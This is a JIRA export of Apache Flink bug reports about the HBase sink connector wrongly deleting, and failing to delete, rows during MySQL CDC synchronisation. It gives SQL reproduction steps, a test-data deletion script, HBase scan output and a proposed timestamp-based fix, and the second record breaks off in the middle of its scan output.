<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,LiuZeshan,LiuZeshan,20/May/23 14:51,20/May/23 14:52,04/Jun/24 20:41,20/May/23 14:52,,,,,,,,,,,,,,,,,,,,,Connectors / HBase,,,,0,,,,"h4. *Problem background*

We meet data accidental deletion and non deletion issues when synchronizing MySQL to HBase using MySQL-CDC and HBase connectors.
h3. Reproduction steps

1、The Flink job with 1 parallelism synchronize a MySQL table into HBase. SinkMaterializer is tunned off by setting {{table.exec.sink.upsert-materialize = 'NONE'}}。

 MySQL table schema is as follows。
CREATE TABLE `source_sample_1001` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(200) DEFAULT NULL,
  `age` int(11) DEFAULT NULL,
  `weight` float DEFAULT NULL,
  PRIMARY KEY (`id`)
);
The source table definition in Flink is as follows.
CREATE TABLE `source_sample_1001` (
     `id` bigint,
     `name` String,
     `age` bigint,
     `weight` float,
    PRIMARY KEY (`id`) NOT ENFORCED
) WITH (
  'connector' = 'mysql-cdc' ,
  'hostname' = '${ip}',
  'port' = '3306',
  'username' = '${user}',
  'password' = '${password}',
  'database-name' = 'testdb_0010',
  'table-name' = 'source_sample_1001'
);
 HBase sink table are created in {{testdb_0011}} namespace.
CREATE 'testdb_0011:source_sample_1001', 'data'
​
describe 'testdb_0011:source_sample_1001'
# describe output
Table testdb_0011:source_sample_1001 is ENABLED                                                                                                                                                         
testdb_0011:source_sample_1001                                                                                                                                                                          
COLUMN FAMILIES DESCRIPTION                                                                                                                                                                             
{NAME => 'data', BLOOMFILTER => 'ROW', IN_MEMORY => 'false', VERSIONS => '1', KEEP_DELETED_CELLS => 'FALSE', DATA_BLOCK_ENCODING => 'NONE', COMPRESSION => 'NONE', TTL => 'FOREVER', MIN_VERSIONS => '0'
, BLOCKCACHE => 'true', BLOCKSIZE => '65536', REPLICATION_SCOPE => '0'}                                                                                                                                 
The sink table definition in Flink.
CREATE TABLE `hbase_sink1` (
    `id` STRING COMMENT 'unique id',
    `data` ROW<
        `name` string,
        `age` bigint,
        `weight` float
    >,
    primary key(`id`) not enforced
) WITH (
    'connector' = 'hbase-2.2',
    'table-name' = 'testdb_0011:source_sample_1001',
    'zookeeper.quorum' = '${hbase.zookeeper.quorum}'
);
DML in flink to synchronize data. 
INSERT INTO `hbase_sink1` SELECT
    REVERSE(CONCAT_WS('', CAST(`id` AS VARCHAR))) as `id`,
    ROW(`name`, `age`, `weight`)
FROM `source_sample_1001`;
2、Another flink job sink datagen data to the MySQL table {{source_sample_1001}} 。id range from 1 to 10_000， that means source_sample_1001 will have at most 10_000 records。
CREATE TABLE datagen_source (
     `id` int,
     `name` String,
     `age` int,
     `weight` float
) WITH (
  'connector' = 'datagen',
  'fields.id.kind' = 'random',
  'fields.id.min' = '1',
  'fields.id.max' = '10000',
  'fields.name.length' = '20',
  'rows-per-second' = '5000'
);
​
CREATE TABLE `source_sample_1001` (
     `id` bigint,
     `name` String,
     `age` bigint,
     `weight` float,
    PRIMARY KEY (`id`) NOT ENFORCED
) WITH (
    'connector' = 'jdbc',
    'url' = 'jdbc:mysql://${ip}:3306/testdb_0010?rewriteBatchedStatements=true&serverTimezone=Asia/Shanghai',
    'table-name' = 'source_sample_1001',
    'username' = '${user}',
    'password' = '${password}',
    'sink.buffer-flush.max-rows' = '500',
    'sink.buffer-flush.interval' = '1s'
);
​
-- dml 
INSERT INTO `source_sample_1001` SELECT * FROM `datagen_source`;
3、A bash script deletes the MySQL table {{source_sample_1001}} with batch 10.
#!/bin/bash
​
mysql1=""mysql -h${ip} -u${user} -p${password}""
batch=10
​
for ((i=1; ;i++)); do
  echo ""iteration $i start""
  for ((j=1; j<=10000; j+=10)); do
    $mysql1 -e ""delete from testdb_0010.source_sample_1001 where id >= $j and id < $((j+10))""
  done
  echo ""iteration $i end""
  sleep 10
done
4、Start the above two flink jobs and the bash script. Wait for several minutes, usually 5 minutes is enough. Please note that deleting data bash script is necessary for reproduce the problem.

5、Stop the bash script, and waiting for MySQL table to fill up with 10_000 data by the datagen flink job。And then stop datagen flink job. Waiting for the sink hbase job to read all the binlog of MySQL table {{source_sample_1001}}.

6、Check the hbase table and reproduce the issue of data loss. As shown below, 67 records of data were lost in a test.
hbase(main):006:0> count  'testdb_0011:source_sample_1001'                                                   
9933 row(s)
Took 0.8724 seconds                                                                                                                                                                                     
=> 9933
Find out a missing record of data and check the raw data in HBase.
hbase(main):008:0> get 'testdb_0011:source_sample_1001', '24'
COLUMN                                              CELL                                                                                                                                                
0 row(s)
Took 0.0029 seconds                                                                                                                                                                                     
hbase(main):009:0> scan 'testdb_0011:source_sample_1001', \{RAW => true, VERSIONS => 1000, STARTROW => '24', STOPROW => '24'}
ROW                                                 COLUMN+CELL                                                                                                                                         
 24                                                 column=data:name, timestamp=2023-05-20T21:17:44.884, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:44.884, value=3a8f571c25a9d9040ef3                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:43.769, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:43.769, value=5aada98281ee0a961841                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:42.902, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:42.902, value=599790a9a641e6121ab3                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:41.614, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:41.614, value=4ece6410d32959457f80                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:40.885, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:40.885, value=9edcfcf1c958a7e4ae2a                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:40.841, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:40.841, value=3d82dcf982d5bcd5b6b7                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:39.788, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:39.788, value=2888a338b65caaf15b30                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:35.799, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:35.799, value=a8d7549e18ef0c0e8674                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:35.688, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:35.688, value=ada7237e52d030dcef7a                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:35.650, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:35.650, value=482feed26918dcdc911e                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:34.885, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:34.885, value=36d6bdd585dbb65dedb7                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:33.905, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:33.905, value=6e15c4462f8435040700                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:33.803, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:33.803, value=d122df5afd4eac32da72                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:33.693, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:33.693, value=ed603d47fedb3852b520                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:31.784, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:31.784, value=1ebdd5fe6310850b8098                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:30.684, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:30.684, value=cc628ba45d1ad07fce2f                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:29.812, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:29.812, value=c1d4df6e987bdb3cd0a3                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:29.590, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:29.590, value=535557700ca01c6b6b1e                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:28.876, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:28.876, value=a63c2ebfefc82eab4bcf                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:28.565, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:28.565, value=dd2b24ff0dfa672c49ba                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:27.879, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:27.879, value=69dbe1287c2bc54781ab                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:27.699, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:27.699, value=775d06dcbf1148e665ee                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:24.209, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:24.209, value=e23c010ab06125c88870                                                                     
 24                                                 column=data:name, timestamp=2023-05-20T21:17:22.480, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:20.716, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:18.678, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:17.720, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:16.858, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:16.682, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:15.753, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:14.571, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:11.572, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:09.681, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:08.792, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:05.888, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:05.754, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:03.626, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:02.652, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:01.790, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:17:00.986, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:59.797, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:58.982, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:58.781, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:58.626, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:58.149, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:56.610, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:51.655, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:51.458, type=Delete                                                                                    
 24                                                 column=data:name, timestamp=2023-05-20T21:16:44.860, type=Delete                                                                                    
1 row(s)
Took 0.1466 seconds                                                                                  
7、Start the bash script to delete all data of the MySQL table. Waiting for the sink hbase job to read all the binlog of MySQL table {{source_sample_1001}}.

6、Check the hbase table and reproduce the issue of data no delete. As shown below, 6 records of data were not deleted in the test.
hbase(main):012:0> count  'testdb_0011:source_sample_1001'
6 row(s)
Took 0.5121 seconds                                                                                                                                                                                     
=> 6
Check the raw data of a record in HBase.
hbase(main):013:0> get 'testdb_0011:source_sample_1001', '3668'
COLUMN                                              CELL                                                                                                                                                
 data:name                                          timestamp=2023-05-20T21:17:26.714, value=ebb15f905622340d0351                                                                                       
1 row(s)
Took 0.0037 seconds                                                                                                                                                                                     
hbase(main):014:0> scan 'testdb_0011:source_sample_1001', \{RAW => true, VERSIONS => 1000, STARTROW => '3668', STOPROW => '3668'}
ROW                                                 COLUMN+CELL                                                                                                                                         
 3668                                               column=data:name, timestamp=2023-05-20T21:17:45.728, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:45.728, value=c675a12c7cbed27599c3                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:44.693, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:44.693, value=413921aa1ac44f545954                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:43.854, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:43.854, value=7d44b0efc0923e4035b7                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:41.721, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:41.721, value=60bfaef81bf8efdf781a                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:40.763, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:40.763, value=2c371f9cd3909dd3b3f8                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:37.872, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:37.872, value=9e32087cb39065976e50                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:32.573, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:32.573, value=708364bf84dad4a04170                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:26.811, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:26.811, value=c0e8e11eed3f8410dea9                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:26.714, value=ebb15f905622340d0351                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:24.310, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:24.310, value=21681a161ed2ccbe884e                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:23.508, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:23.508, value=a1ef547a9efd57a7a0e2                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:22.788, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:22.788, value=34e688060e6c40f4f83b                                                                     
 3668                                               column=data:name, timestamp=2023-05-20T21:17:21.746, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:17.761, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:12.610, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:11.909, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:07.846, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:06.901, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:06.758, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:06.569, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:02.689, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:17:00.344, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:59.961, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:59.415, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:58.916, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:58.781, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:58.718, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:58.339, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:56.340, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:55.883, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:55.683, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:55.056, type=Delete                                                                                    
 3668                                               column=data:name, timestamp=2023-05-20T21:16:46.845, type=Delete                                                                                    
1 row(s)
Took 0.0457 seconds                                                                                           
h4. *Reason for the problem*

The [HBase connector|https://github.com/apache/flink/blob/06688f345f6793a8964ec00002175f44cda13c33/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L177] use the [Delete key type|https://github.com/apache/hbase/blob/c05ee564d3026688bcfdc456071059c7c8409694/hbase-client/src/main/java/org/apache/hadoop/hbase/client/Delete.java#L380] [without timestamp|https://github.com/apache/flink/blob/06688f345f6793a8964ec00002175f44cda13c33/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L168] to {{delete the latest version of the specified column. This is an expensive call in that on the server-side, it first does a get to find the latest versions timestamp. Then it adds a delete using the fetched cells timestamp}}. Causing the following issues:

Problem 1: When writing update data, the timestamp of -U and +U added by the hbase server to the update message may be the same, and -U deleted the latest version of +U data, resulting in accidental deletion of the data. The problem reported by https://issues.apache.org/jira/browse/FLINK-28910

Problem 2: When there are multiple versions of HBase data, deleting the data will exposes earlier versions of the data, and resulting in the issue of data no delete.
h4. *Solution proposal*

Use the [DeleteColumn key type|https://github.com/apache/hbase/blob/c05ee564d3026688bcfdc456071059c7c8409694/hbase-client/src/main/java/org/apache/hadoop/hbase/client/Delete.java#L322] and set strongly increasing timestamp for [put|https://github.com/lzshlzsh/flink/blob/a2341810a244b97a3af32951e17efbc49f570cdd/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L138] and [delete|https://github.com/lzshlzsh/flink/blob/a2341810a244b97a3af32951e17efbc49f570cdd/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L170] mutation. The delete mutation will delete all versions of the specified column with a timestamp less than or equal to the specified.

I have test the proposed solution for seval days, and neither the data accidental deletion nor non deletion issues happen.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-20 14:51:04.0,,,,,,,,,,"0|z1i0rs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Data accidentally deleted and not deleted when upsert sink to hbase,FLINK-32139,13536951,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,LiuZeshan,LiuZeshan,LiuZeshan,20/May/23 14:49,30/Jun/23 12:41,04/Jun/24 20:41,30/Jun/23 12:32,,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / HBase,,,,0,pull-request-available,,,"h4. *Problem background*

We meet data accidental deletion and non deletion issues when synchronizing MySQL cdc data to HBase using HBase connectors.
h3. Reproduction steps

1、The Flink job with 1 parallelism synchronize a MySQL table into HBase. SinkUpsertMaterializer is tunned off by setting {{{}table.exec.sink.upsert-materialize = 'NONE'{}}}。

MySQL table schema is as follows。
{code:java}
CREATE TABLE `source_sample_1001` (
`id` int(11) NOT NULL AUTO_INCREMENT,
`name` varchar(200) DEFAULT NULL,
`age` int(11) DEFAULT NULL,
`weight` float DEFAULT NULL,
PRIMARY KEY (`id`)
);{code}
The source table definition in Flink is as follows.
{code:java}
CREATE TABLE `source_sample_1001` (
    `id` bigint,
    `name` String,
    `age` bigint,
    `weight` float,
  PRIMARY KEY (`id`) NOT ENFORCED
) WITH (
'connector' = 'mysql-cdc' ,
'hostname' = '${ip}',
'port' = '3306',
'username' = '${user}',
'password' = '${password}',
'database-name' = 'testdb_0010',
'table-name' = 'source_sample_1001'
);{code}
HBase sink table are created in {{testdb_0011}} namespace.
{code:java}
CREATE 'testdb_0011:source_sample_1001', 'data'
​
describe 'testdb_0011:source_sample_1001'
 
# describe output
Table testdb_0011:source_sample_1001 is ENABLED                                                                                                                                                         
testdb_0011:source_sample_1001                                                                                                                                                                          
COLUMN FAMILIES DESCRIPTION                                                                                                                                                                             {NAME => 'data', BLOOMFILTER => 'ROW', IN_MEMORY => 'false', VERSIONS => '1', KEEP_DELETED_CELLS => 'FALSE', DATA_BLOCK_ENCODING => 'NONE', COMPRESSION => 'NONE', TTL => 'FOREVER', MIN_VERSIONS => '0' , BLOCKCACHE => 'true', BLOCKSIZE => '65536', REPLICATION_SCOPE => '0'}
{code}
 

                                                                                                                                
The sink table definition in Flink.
{code:java}
CREATE TABLE `hbase_sink1` (
    `id` STRING COMMENT 'unique id',
    `data` ROW<
        `name` string,
        `age` string,
        `weight` string
    >,
    primary key(`id`) not enforced
) WITH (
  'connector' = 'hbase-2.2',
  'table-name' = 'testdb_0011:source_sample_1001',
  'zookeeper.quorum' = '${hbase.zookeeper.quorum}'
);{code}
DML in flink to synchronize data.
{code:java}
INSERT INTO `hbase_sink1` SELECT
    `id`, row(`name`, `age`, `weight`)
FROM (
    SELECT
        REVERSE(CONCAT_WS('', CAST(id AS VARCHAR ))) as id,
        `name`, cast(`age` as varchar) as `age`, cast(`weight` as varchar) as `weight`
    FROM `source_sample_1001`
) t;{code}
2、Another flink job sinks datagen data to the MySQL table {{source_sample_1001}} 。id range from 1 to 10_000， that means source_sample_1001 will have at most 10_000 records。
{code:java}
CREATE TABLE datagen_source (
    `id` int,
    `name` String,
    `age` int,
    `weight` int
) WITH (
   'connector' = 'datagen',
  'fields.id.kind' = 'random',
  'fields.id.min' = '1',
  'fields.id.max' = '10000',
  'fields.name.length' = '20',
  'fields.age.min' = '1',
  'fields.age.max' = '150',
  'fields.weight.min' = '5',
  'fields.weight.max' = '300',
  'rows-per-second' = '5000'
);
​
CREATE TABLE `source_sample_1001` (
    `id` bigint,
    `name` String,
    `age` bigint,
    `weight` float,
  PRIMARY KEY (`id`) NOT ENFORCED
) WITH (
  'connector' = 'jdbc',
  'url' = 'jdbc:mysql://${ip}:3306/testdb_0010?rewriteBatchedStatements=true&serverTimezone=Asia/Shanghai',
  'table-name' = 'source_sample_1001',
  'username' = '${user}',
  'password' = '${password}',
  'sink.buffer-flush.max-rows' = '500',
  'sink.buffer-flush.interval' = '1s'
);
​
-- dml
INSERT INTO `source_sample_1001` SELECT `id`, `name`, `age`, cast(`weight` as float) FROM `datagen_source`;{code}
3、A bash script deletes the MySQL table {{source_sample_1001}} with batch 10.
{code:java}
#!/bin/bash
​
mysql1=""mysql -h${ip} -u${user} -p${password}""
batch=10
​
for ((i=1; ;i++)); do
echo ""iteration $i start""
for ((j=1; j<=10000; j+=10)); do
  $mysql1 -e ""delete from testdb_0010.source_sample_1001 where id >= $j and id < $((j+10))""
done
echo ""iteration $i end""
sleep 10
done{code}
4、Start the above two flink jobs and the bash script. Wait for several minutes, usually 5 minutes is enough. Please note that deleting data bash script is necessary for reproduce the problem.

5、Stop the bash script, and waiting for MySQL table to fill up with 10_000 data by the datagen flink job。And then stop datagen flink job. Waiting for the sink hbase job to read all the binlog of MySQL table {{{}source_sample_1001{}}}.

6、Check the hbase table and reproduce the issue of data loss. As shown below, 67 records were lost in a test.
{code:java}
hbase(main):006:0> count 'testdb_0011:source_sample_1001'                                                   
9933 row(s)
Took 0.8724 seconds                                                                                                                                                                                     
=> 9933{code}
Find out a missing record and check the raw data in HBase.
{code:java}
hbase(main):008:0> get 'testdb_0011:source_sample_1001', '24'
COLUMN                                             CELL                                                                                                                                                
0 row(s)
Took 0.0029 seconds                                                                                                                                                                                     
hbase(main):009:0> scan 'testdb_0011:source_sample_1001', {RAW => true, VERSIONS => 1000, STARTROW => '24', STOPROW => '24'}
ROW                                                 COLUMN+CELL                                                                                                                                         
24                                                 column=data:name, timestamp=2023-05-20T21:17:44.884, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:44.884, value=3a8f571c25a9d9040ef3                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:43.769, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:43.769, value=5aada98281ee0a961841                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:42.902, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:42.902, value=599790a9a641e6121ab3                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:41.614, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:41.614, value=4ece6410d32959457f80                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:40.885, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:40.885, value=9edcfcf1c958a7e4ae2a                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:40.841, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:40.841, value=3d82dcf982d5bcd5b6b7                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:39.788, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:39.788, value=2888a338b65caaf15b30                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:35.799, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:35.799, value=a8d7549e18ef0c0e8674                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:35.688, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:35.688, value=ada7237e52d030dcef7a                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:35.650, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:35.650, value=482feed26918dcdc911e                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:34.885, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:34.885, value=36d6bdd585dbb65dedb7                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:33.905, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:33.905, value=6e15c4462f8435040700                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:33.803, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:33.803, value=d122df5afd4eac32da72                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:33.693, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:33.693, value=ed603d47fedb3852b520                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:31.784, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:31.784, value=1ebdd5fe6310850b8098                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:30.684, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:30.684, value=cc628ba45d1ad07fce2f                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:29.812, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:29.812, value=c1d4df6e987bdb3cd0a3                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:29.590, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:29.590, value=535557700ca01c6b6b1e                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:28.876, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:28.876, value=a63c2ebfefc82eab4bcf                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:28.565, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:28.565, value=dd2b24ff0dfa672c49ba                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:27.879, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:27.879, value=69dbe1287c2bc54781ab                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:27.699, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:27.699, value=775d06dcbf1148e665ee                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:24.209, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:24.209, value=e23c010ab06125c88870                                                                     
24                                                 column=data:name, timestamp=2023-05-20T21:17:22.480, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:20.716, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:18.678, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:17.720, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:16.858, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:16.682, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:15.753, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:14.571, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:11.572, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:09.681, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:08.792, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:05.888, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:05.754, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:03.626, type=Delete                                                                                    
